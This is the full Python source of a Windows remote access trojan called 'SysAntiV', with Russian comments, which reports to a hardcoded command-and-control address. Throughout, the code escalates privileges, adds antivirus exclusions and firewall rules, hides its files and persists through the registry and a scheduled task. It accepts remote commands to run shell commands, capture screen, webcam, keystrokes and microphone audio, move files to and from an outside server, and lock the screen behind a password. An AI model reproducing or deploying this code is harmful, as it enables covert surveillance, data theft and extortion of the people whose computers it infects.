# -*- coding: utf-8 -*-
import os
import sys
import time
import random
import socket
import platform
import subprocess
import base64
import shutil
import ctypes
import ctypes.wintypes
import threading
from io import BytesIO
from email.message import EmailMessage
from datetime import datetime

# Импорты с подавлением ошибок
try:
    import socketio
    import requests
    import urllib3
    import winreg
    import numpy as np
except ImportError:
    pass

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    import pyaudio
    import wave
    HAS_PYAUDIO = True
except ImportError:
    HAS_PYAUDIO = False

try:
    import wmi
    HAS_WMI = True
except ImportError:
    HAS_WMI = False

try:
    import tkinter as tk
    from tkinter import font
    HAS_TKINTER = True
except ImportError:
    HAS_TKINTER = False

HAS_PYAUTOGUI = False
try:
    import pyautogui
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE = 0.0
    HAS_PYAUTOGUI = True
except Exception:
    pass

HAS_CV2 = False
try:
    import cv2
    HAS_CV2 = True
except Exception:
    pass

try:
    from PIL import Image
except Exception:
    pass

try:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except: pass

# ─── КОНФИГУРАЦИЯ ─────────────────────────────────────────────────
C2_SERVER           = 'http://146.19.230.38:1234'
CLOUD_URL           = 'https://146.19.230.38:5471'
APP_NAME            = "SysAntiV"
MUTEX_NAME          = "Global\\SysAntiV_Priority_Mutex_v4"

STARTUP_DELAY       = 10
RECONNECT_DELAY     = 10
NETWORK_CHECK_DELAY = 5
NETWORK_TIMEOUT     = 600
CMD_TIMEOUT         = 120
MAX_DIR_ENTRIES     = 200

CURRENT_CWD = os.getcwd()

# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
KEYLOGGER_THREAD, IS_LOGGING_KEYS, KEYLOG_FILE = None, False, ""
AUDIO_THREAD, IS_RECORDING_AUDIO, AUDIO_FILENAME = None, False, ""
LOCKER_THREAD, LOCKER_WINDOW, LOCKER_PASSWORD = None, None, None

def get_console_encoding():
    try:
        return f'cp{ctypes.windll.kernel32.GetOEMCP()}'
    except Exception:
        return 'cp866'

CONSOLE_ENCODING = get_console_encoding()

# ═══════════════════════════════════════════════════════════════════
#                  ПРИВИЛЕГИИ И ЗАЩИТА
# ═══════════════════════════════════════════════════════════════════

def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False

def get_real_exe_path():
    if getattr(sys, 'frozen', False):
        return os.path.abspath(sys.executable)
    return os.path.abspath(__file__)

def elevate_if_needed():
    if is_admin():
        return
    try:
        if getattr(sys, 'frozen', False):
            exe = get_real_exe_path()
            params = ""
        else:
            exe = sys.executable
            params = f'"{os.path.abspath(__file__)}"'
        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params, None, 0)
        if ret > 32:
            sys.exit(0)
    except Exception:
        pass

def enable_all_privileges():
    if not is_admin(): return
    try:
        advapi32, kernel32 = ctypes.windll.advapi32, ctypes.windll.kernel32
        TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, SE_PRIVILEGE_ENABLED = 0x0020, 0x0008, 0x00000002
        class LUID(ctypes.Structure): _fields_ = [("LowPart", ctypes.wintypes.DWORD), ("HighPart", ctypes.wintypes.LONG)]
        class LUID_AND_ATTRIBUTES(ctypes.Structure): _fields_ = [("Luid", LUID), ("Attributes", ctypes.wintypes.DWORD)]
        class TOKEN_PRIVILEGES(ctypes.Structure): _fields_ = [("PrivilegeCount", ctypes.wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1)]
        privs = ["SeDebugPrivilege", "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege", "SeSecurityPrivilege", "SeLoadDriverPrivilege", "SeSystemEnvironmentPrivilege", "SeManageVolumePrivilege", "SeImpersonatePrivilege", "SeCreateGlobalPrivilege", "SeIncreaseBasePriorityPrivilege", "SeShutdownPrivilege", "SeUndockPrivilege", "SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"]
        hToken = ctypes.wintypes.HANDLE()
        hProcess = kernel32.GetCurrentProcess()
        if not advapi32.OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(hToken)): return
        for priv_name in privs:
            try:
                luid = LUID()
                if not advapi32.LookupPrivilegeValueW(None, priv_name, ctypes.byref(luid)): continue
                tp = TOKEN_PRIVILEGES(); tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
                advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None)
            except: pass
        kernel32.CloseHandle(hToken)
    except: pass

def hide_from_taskmgr():
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetPriorityClass(kernel32.GetCurrentProcess(), 0x00008000)
    except Exception: pass

def add_defender_exclusions():
    if not is_admin(): return
    exe_path = get_real_exe_path()
    install_dir = os.path.join(os.getenv('APPDATA', ''), APP_NAME)
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths")
        winreg.SetValueEx(key, install_dir, 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, exe_path, 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except: pass
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes")
        winreg.SetValueEx(key, os.path.basename(exe_path), 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except: pass

def hide_install_dir():
    install_dir = os.path.join(os.getenv('APPDATA', ''), APP_NAME)
    if os.path.exists(install_dir):
        try: ctypes.windll.kernel32.SetFileAttributesW(install_dir, 0x02 | 0x04)
        except: pass

def add_firewall_rule():
    if not is_admin(): return
    exe_path = get_real_exe_path()
    install_exe = os.path.join(os.getenv('APPDATA', ''), APP_NAME, os.path.basename(exe_path))
    for path in set([exe_path, install_exe]):
        try:
            subprocess.run(f'netsh advfirewall firewall add rule name="{APP_NAME}" dir=out action=allow program="{path}" enable=yes profile=any', shell=True, capture_output=True, timeout=15, creationflags=0x08000000)
        except: pass

# ═══════════════════════════════════════════════════════════════════
#                     МЬЮТЕКС И ПРОЦЕССЫ
# ═══════════════════════════════════════════════════════════════════

def create_mutex():
    try:
        handle = ctypes.windll.kernel32.CreateMutexW(None, True, MUTEX_NAME)
        if ctypes.windll.kernel32.GetLastError() == 183: return False
        create_mutex._handle = handle
        return True
    except: return True

def force_kill_duplicates():
    try:
        subprocess.run(f'taskkill /F /FI "PID ne {os.getpid()}" /IM "{os.path.basename(get_real_exe_path())}"', shell=True, capture_output=True, timeout=15)
        time.sleep(2)
    except: pass

# ═══════════════════════════════════════════════════════════════════
#            ПЕРСИСТЕНТНОСТЬ И УСТАНОВКА
# ═══════════════════════════════════════════════════════════════════

def setup_persistence(exe_path):
    # Registry Run
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except: pass
    # Scheduler Task
    try:
        subprocess.run(f'schtasks /Create /TN "{APP_NAME}" /TR "\\"{exe_path}\\"" /SC ONLOGON /RL HIGHEST /F', shell=True, capture_output=True, timeout=15, creationflags=0x08000000)
    except: pass

def install():
    if platform.system() != "Windows": return
    current_exe = get_real_exe_path()
    if not os.path.isfile(current_exe): return

    dest_dir = os.path.join(os.getenv('APPDATA'), APP_NAME)
    exe_basename = os.path.basename(current_exe)
    if getattr(sys, 'frozen', False) and not exe_basename.lower().endswith('.exe'):
        exe_basename = APP_NAME + '.exe'
    dest_exe = os.path.join(dest_dir, exe_basename)

    setup_persistence(dest_exe)

    if os.path.normpath(current_exe).lower() == os.path.normpath(dest_exe).lower():
        hide_install_dir()
        return

    try:
        os.makedirs(dest_dir, exist_ok=True)
        time.sleep(0.5)
        shutil.copy2(current_exe, dest_exe)
        if os.path.getsize(dest_exe) < 1000: return
        hide_install_dir()
        subprocess.Popen([dest_exe], creationflags=0x08000000, close_fds=True)
        sys.exit(0)
    except: pass

# ═══════════════════════════════════════════════════════════════════
#                          СЕТЬ И ИНФО
# ═══════════════════════════════════════════════════════════════════

def wait_for_network():
    start = time.time()
    while time.time() - start < NETWORK_TIMEOUT:
        for host, port in [("8.8.8.8", 53), ("1.1.1.1", 53)]:
            try:
                conn = socket.create_connection((host, port), timeout=3)
                conn.close()
                return True
            except: pass
        time.sleep(NETWORK_CHECK_DELAY)
    return False

def get_sys_info():
    tag = "(Admin)" if is_admin() else "(User)"
    return {'pc_name': socket.gethostname(), 'username': f"{os.environ.get('USERNAME', 'User')} {tag}"}

def get_download_path():
    return os.path.join(os.path.expanduser('~'), 'Downloads')

def get_install_path():
    return os.path.join(os.getenv('APPDATA'), APP_NAME)

# ═══════════════════════════════════════════════════════════════════
#                   ФУНКЦИИ ЗАХВАТА И АНАЛИЗА
# ═══════════════════════════════════════════════════════════════════

def safe_screenshot():
    if not HAS_PYAUTOGUI: raise RuntimeError("pyautogui not available")
    img = pyautogui.screenshot()
    if img.mode in ("RGBA", "P"): img = img.convert("RGB")
    buf = BytesIO(); img.save(buf, format='JPEG', quality=60)
    return base64.b64encode(buf.getvalue()).decode()

def safe_camera_capture():
    if not HAS_CV2: raise RuntimeError("OpenCV not available")
    cap = None
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened(): raise RuntimeError("Camera busy")
        for _ in range(7): cap.read()
        ret, frame = cap.read()
        if not ret or frame is None: raise RuntimeError("Black frame")
        _, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
        return base64.b64encode(buf.tobytes()).decode()
    finally:
        if cap is not None:
            try: cap.release()
            except: pass

def get_full_system_info():
    if not HAS_PSUTIL: return "Error: psutil library is not available."
    try:
        info = []; uname = platform.uname()
        info.append(f"OS: {uname.system} {uname.release} | Arch: {uname.machine} | Host: {uname.node}")
        cpufreq = psutil.cpu_freq()
        info.append(f"CPU: {psutil.cpu_count(logical=True)} Cores @ {cpufreq.current:.2f} Mhz (Usage: {psutil.cpu_percent()}%)")
        svmem = psutil.virtual_memory()
        info.append(f"RAM: {svmem.total / (1024**3):.2f} GB (Used: {svmem.percent}%)")
        info.append("\n" + "="*20 + " DISKS " + "="*20)
        for p in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(p.mountpoint)
                info.append(f"  - {p.device} ({p.mountpoint}) | Used: {usage.percent}%")
            except: continue
        info.append("\n" + "="*20 + " NETWORK " + "="*20)
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                if str(address.family) == 'AddressFamily.AF_INET':
                    info.append(f"{interface_name}: {address.address}")
        return "\n".join(info)
    except Exception as e: return f"System analysis error: {e}"

def get_deep_system_info():
    if not HAS_WMI: return "Error: WMI library is not available."
    info = []
    try:
        c = wmi.WMI()
        info.append("="*20 + " MOTHERBOARD " + "="*20)
        try:
            for board in c.Win32_BaseBoard():
                info.append(f"Manufacturer: {board.Manufacturer} | Product: {board.Product}")
        except: info.append("Could not retrieve motherboard info.")

        info.append("\n" + "="*20 + " GPU " + "="*20)
        try:
            for gpu in c.Win32_VideoController():
                info.append(f"Name: {gpu.Name}")
        except: info.append("Could not retrieve GPU info.")

        info.append("\n" + "="*20 + " SOUND DEVICES " + "="*20)
        try:
            for dev in c.Win32_SoundDevice(): info.append(f"Name: {dev.Name} - Status: {dev.Status}")
        except: info.append("Could not retrieve sound device info.")

        return "\n".join(info)
    except Exception as e: return f"Deep system analysis error: {e}"

def get_network_scan_info():
    try:
        info = ["="*20 + " ARP Table " + "="*20]
        result = subprocess.run("arp -a", capture_output=True, text=True, timeout=15, shell=True, encoding=CONSOLE_ENCODING, errors='ignore')
        info.append(result.stdout.strip() or "ARP table is empty.")
        return "\n".join(info)
    except Exception as e: return f"Network scan error: {e}"

# ═══════════════════════════════════════════════════════════════════
#             ФУНКЦИИ ЗАПИСИ, БЛОКИРОВКИ И УПРАВЛЕНИЯ
# ═══════════════════════════════════════════════════════════════════

def keylogger_worker():
    global IS_LOGGING_KEYS, KEYLOG_FILE
    def on_press(key):
        if not IS_LOGGING_KEYS: return False
        try:
            with open(KEYLOG_FILE, "a", encoding='utf-8') as f:
                if hasattr(key, 'char') and key.char: f.write(key.char)
                elif key == keyboard.Key.space: f.write(' ')
                elif key == keyboard.Key.enter: f.write('\n')
                else: f.write(f'[{str(key).split(".")[-1]}]')
        except: pass
    with keyboard.Listener(on_press=on_press) as listener: listener.join()

def record_audio_worker():
    global IS_RECORDING_AUDIO, AUDIO_FILENAME
    if not HAS_PYAUDIO: return
    p = pyaudio.PyAudio()
    try:
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        while IS_RECORDING_AUDIO: frames.append(stream.read(1024))
        stream.stop_stream(); stream.close()
        with wave.open(AUDIO_FILENAME, 'wb') as wf:
            wf.setnchannels(1); wf.setsampwidth(p.get_sample_size(pyaudio.paInt16)); wf.setframerate(44100)
            wf.writeframes(b''.join(frames))
    except: pass
    finally: p.terminate()

def open_cd_tray(drive_letter='D'):
    try: return ctypes.windll.winmm.mciSendStringW(f"set {drive_letter}: door open", None, 0, None) == 0
    except: return False

def close_cd_tray(drive_letter='D'):
    try: return ctypes.windll.winmm.mciSendStringW(f"set {drive_letter}: door closed", None, 0, None) == 0
    except: return False

def locker_gui_thread(text_to_display, password):
    global LOCKER_WINDOW, LOCKER_PASSWORD
    if not HAS_TKINTER: return
    LOCKER_PASSWORD = password
    def check_password(event=None):
        if pass_entry.get() == LOCKER_PASSWORD: LOCKER_WINDOW.destroy()
    root = tk.Tk()
    LOCKER_WINDOW = root
    root.attributes('-fullscreen', True); root.attributes('-topmost', True)
    root.configure(background='black'); root.protocol("WM_DELETE_WINDOW", lambda: None)
    title_font = font.Font(family="Arial", size=24, weight="bold")
    text_font = font.Font(family="Courier New", size=16)
    tk.Label(root, text=text_to_display, font=text_font, fg="red", bg="black", wraplength=root.winfo_screenwidth()-100).pack(pady=(100, 20))
    tk.Label(root, text="Enter Password:", font=title_font, fg="white", bg="black").pack(pady=20)
    pass_entry = tk.Entry(root, font=title_font, show="*", bg="gray20", fg="white", insertbackground="white")
    pass_entry.pack(pady=20); pass_entry.focus_set()
    tk.Button(root, text="Unlock", font=title_font, command=check_password, bg="green", fg="white").pack(pady=40)
    root.bind('<Return>', check_password)
    def force_focus():
        if LOCKER_WINDOW and LOCKER_WINDOW.winfo_exists():
            root.focus_force(); root.after(500, force_focus)
    force_focus(); root.mainloop()
    LOCKER_WINDOW, LOCKER_PASSWORD = None, None

# ═══════════════════════════════════════════════════════════════════
#                          ОБРАБОТЧИКИ C2
# ═══════════════════════════════════════════════════════════════════

def safe_sid(sio_client):
    try: return sio_client.get_sid()
    except: return None

def emit_response(sio_client, rtype, data):
    try:
        sio_client.emit('bot_response', {'sid': safe_sid(sio_client), 'type': rtype, 'data': data})
    except: pass

def register_events(sio_client):
    @sio_client.event
    def connect(): sio_client.emit('register', get_sys_info())
    @sio_client.event
    def connect_error(data): pass
    @sio_client.event
    def disconnect(): pass

    @sio_client.on('exec_cmd')
    def on_exec(data):
        global CURRENT_CWD; cmd = data.get('cmd') if isinstance(data, dict) else data
        if not cmd: return
        try:
            if cmd.strip().lower().startswith("cd "):
                new_dir = os.path.join(CURRENT_CWD, cmd.strip()[3:]) if not os.path.isabs(cmd.strip()[3:]) else cmd.strip()[3:]
                if cmd.strip()[3:] == "..": new_dir = os.path.dirname(CURRENT_CWD)
                if os.path.isdir(new_dir): CURRENT_CWD = os.path.normpath(new_dir); out = f"Directory: {CURRENT_CWD}"
                else: out = f"Path not found: {new_dir}"
            else:
                res = subprocess.run(cmd, shell=True, cwd=CURRENT_CWD, capture_output=True, text=True, timeout=CMD_TIMEOUT, encoding=CONSOLE_ENCODING, errors='ignore')
                out = (res.stdout + res.stderr).strip() or "Done."
        except subprocess.TimeoutExpired: out = f"Timed out ({CMD_TIMEOUT}s)"
        except Exception as e: out = f"Error: {e}"
        emit_response(sio_client, 'text', f"{out}\n\n{CURRENT_CWD}>")

    @sio_client.on('get_screen')
    def on_screen(_):
        try: emit_response(sio_client, 'image_screen', safe_screenshot())
        except Exception as e: emit_response(sio_client, 'text', f"Screenshot error: {e}")

    @sio_client.on('get_cam')
    def on_cam(_):
        try: emit_response(sio_client, 'image_cam', safe_camera_capture())
        except Exception as e: emit_response(sio_client, 'text', f"Camera error: {e}")

    @sio_client.on('list_files')
    def on_list(data):
        path = data.get('path', 'C:\\') if isinstance(data, dict) else str(data)
        try:
            items = [];
            with os.scandir(path) as it:
                for i, entry in enumerate(it):
                    if i >= MAX_DIR_ENTRIES: items.append(f"... (limit {MAX_DIR_ENTRIES})"); break
                    items.append(f"{'[DIR] ' if entry.is_dir() else '[FILE]'} {entry.name}")
            res = "\n".join(items) or "(Empty)"
        except Exception as e: res = f"Error: {e}"
        emit_response(sio_client, 'text', f"DIR {path}:\n{res}")

    @sio_client.on('cloud_upload')
    def on_cloud_upload(data):
        if not isinstance(data, dict): return
        path = data.get('path', '').strip('"')
        if not os.path.exists(path): emit_response(sio_client, 'text', "File not found"); return
        try:
            with open(path, 'rb') as f:
                r = requests.post(f"{CLOUD_URL}/upload", files={'file': f}, data={'password': data.get('password')}, verify=False, timeout=300)
            msg = f"ID: {r.json().get('id')}" if r.status_code == 200 else f"Error {r.status_code}: {r.text[:100]}"
            emit_response(sio_client, 'text', msg)
        except Exception as e: emit_response(sio_client, 'text', f"Upload error: {e}")

    @sio_client.on('cloud_download')
    def on_cloud_download(data):
        if not isinstance(data, dict): return
        try:
            r = requests.post(f"{CLOUD_URL}/download/{data.get('file_id')}", json={'password': data.get('password')}, stream=True, verify=False, timeout=300)
            if r.status_code == 200:
                fname = "file.dat"
                if cd := r.headers.get("Content-Disposition", ""):
                    try: m = EmailMessage(); m['content-disposition'] = cd; fname = m.get_filename() or fname
                    except: pass
                save_path = os.path.join(get_download_path(), fname)
                with open(save_path, 'wb') as f:
                    for chunk in r.iter_content(8192): f.write(chunk)
                emit_response(sio_client, 'text', f"Saved: {save_path}")
            else: emit_response(sio_client, 'text', f"Error: {r.status_code}")
        except Exception as e: emit_response(sio_client, 'text', f"Download error: {e}")

    @sio_client.on('get_sysinfo')
    def on_get_sysinfo(_): emit_response(sio_client, 'text', get_full_system_info())
    @sio_client.on('get_deepinfo')
    def on_get_deepinfo(_): emit_response(sio_client, 'text', get_deep_system_info())
    @sio_client.on('get_netinfo')
    def on_get_netinfo(_): emit_response(sio_client, 'text', get_network_scan_info())

    @sio_client.on('start_keylogger')
    def on_start_keylogger(_):
        global IS_LOGGING_KEYS, KEYLOGGER_THREAD, KEYLOG_FILE
        if not HAS_PYNPUT: emit_response(sio_client, 'text', "Keylogger error: pynput not available."); return
        if IS_LOGGING_KEYS: emit_response(sio_client, 'text', "Keylogger is already running."); return
        IS_LOGGING_KEYS = True; KEYLOG_FILE = os.path.join(get_install_path(), "keylog.txt")
        KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, daemon=True); KEYLOGGER_THREAD.start()
        emit_response(sio_client, 'text', f"Keylogger started. Log file: {KEYLOG_FILE}")

    @sio_client.on('stop_keylogger')
    def on_stop_keylogger(_):
        global IS_LOGGING_KEYS
        if not IS_LOGGING_KEYS: emit_response(sio_client, 'text', "Keylogger is not running."); return
        IS_LOGGING_KEYS = False
        try: controller = keyboard.Controller(); controller.press(keyboard.Key.ctrl); controller.release(keyboard.Key.ctrl)
        except: pass
        emit_response(sio_client, 'text', f"Keylogger stopped. Log file: {KEYLOG_FILE}")

    @sio_client.on('start_audio_rec')
    def on_start_audio_rec(_):
        global IS_RECORDING_AUDIO, AUDIO_THREAD, AUDIO_FILENAME
        if not HAS_PYAUDIO: emit_response(sio_client, 'text', "Audio recording error: PyAudio not available."); return
        if IS_RECORDING_AUDIO: emit_response(sio_client, 'text', "Audio recording is already in progress."); return
        IS_RECORDING_AUDIO = True; AUDIO_FILENAME = os.path.join(get_install_path(), f"audio_{int(time.time())}.wav")
        AUDIO_THREAD = threading.Thread(target=record_audio_worker, daemon=True); AUDIO_THREAD.start()
        emit_response(sio_client, 'text', f"Audio recording started. Output: {AUDIO_FILENAME}")

    @sio_client.on('stop_audio_rec')
    def on_stop_audio_rec(_):
        global IS_RECORDING_AUDIO, AUDIO_THREAD
        if not IS_RECORDING_AUDIO: emit_response(sio_client, 'text', "Audio recording is not active."); return
        IS_RECORDING_AUDIO = False
        if AUDIO_THREAD: AUDIO_THREAD.join(timeout=5)
        emit_response(sio_client, 'text', f"Audio recording stopped. File saved: {AUDIO_FILENAME}")

    @sio_client.on('lock_screen')
    def on_lock_screen(data):
        global LOCKER_THREAD, LOCKER_WINDOW
        if not HAS_TKINTER: emit_response(sio_client, 'text', "Locker error: tkinter not available."); return
        if LOCKER_WINDOW and LOCKER_WINDOW.winfo_exists(): emit_response(sio_client, 'text', "Screen is already locked."); return
        text = data.get('text', 'SYSTEM LOCKED'); password = data.get('password', '12345')
        LOCKER_THREAD = threading.Thread(target=locker_gui_thread, args=(text, password), daemon=True); LOCKER_THREAD.start()
        emit_response(sio_client, 'text', f"Screen lock command sent with password '{password}'.")

    @sio_client.on('unlock_screen')
    def on_unlock_screen(_):
        global LOCKER_WINDOW
        if not LOCKER_WINDOW or not LOCKER_WINDOW.winfo_exists(): emit_response(sio_client, 'text', "Screen is not locked."); return
        LOCKER_WINDOW.destroy(); emit_response(sio_client, 'text', "Remote unlock command sent.")

    @sio_client.on('open_cd')
    def on_open_cd(data):
        drive = data.get('drive', 'D') if isinstance(data, dict) else 'D'
        if open_cd_tray(drive): emit_response(sio_client, 'text', f"CD tray '{drive}:' open sent.")
        else: emit_response(sio_client, 'text', f"Failed to open CD tray '{drive}:'.")

    @sio_client.on('close_cd')
    def on_close_cd(data):
        drive = data.get('drive', 'D') if isinstance(data, dict) else 'D'
        if close_cd_tray(drive): emit_response(sio_client, 'text', f"CD tray '{drive}:' close sent.")
        else: emit_response(sio_client, 'text', f"Failed to close CD tray '{drive}:'.")

    @sio_client.on('mouse_move')
    def on_mouse_move(data):
        if not HAS_PYAUTOGUI: return
        try:
            x, y, duration = int(data['x']), int(data['y']), float(data.get('duration', 0.2))
            pyautogui.moveTo(x, y, duration=duration)
        except Exception as e: emit_response(sio_client, 'text', f"Mouse move error: {e}")

    @sio_client.on('mouse_click')
    def on_mouse_click(data):
        if not HAS_PYAUTOGUI: return
        try:
            pyautogui.click(button=data.get('button', 'left'), clicks=int(data.get('clicks', 1)))
        except Exception as e: emit_response(sio_client, 'text', f"Mouse click error: {e}")

    @sio_client.on('type_text')
    def on_type_text(data):
        if not HAS_PYAUTOGUI: return
        try:
            pyautogui.write(data['text'], interval=float(data.get('interval', 0.01)))
        except Exception as e: emit_response(sio_client, 'text', f"Typing error: {e}")

# ═══════════════════════════════════════════════════════════════════
#                          MAIN
# ═══════════════════════════════════════════════════════════════════

def main():
    elevate_if_needed()
    enable_all_privileges()
    add_defender_exclusions()
    time.sleep(random.uniform(0, 2))
    if is_admin(): force_kill_duplicates()
    if not create_mutex():
        if is_admin(): time.sleep(3);
        if not create_mutex(): sys.exit(0)
    hide_from_taskmgr(); add_firewall_rule()
    time.sleep(STARTUP_DELAY)
    install()
    wait_for_network()

    while True:
        sio = None
        try:
            sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=5, reconnection_delay_max=30, logger=False, engineio_logger=False)
            register_events(sio)
            sio.connect(C2_SERVER, transports=['websocket', 'polling'], wait_timeout=30)
            sio.wait()
        except SystemExit: raise
        except Exception: pass
        finally:
            if sio:
                try: sio.disconnect()
                except: pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    try: main()
    except SystemExit: pass
    except Exception:
        while True:
            try:
                time.sleep(60); main()
            except SystemExit: break
            except Exception: time.sleep(60)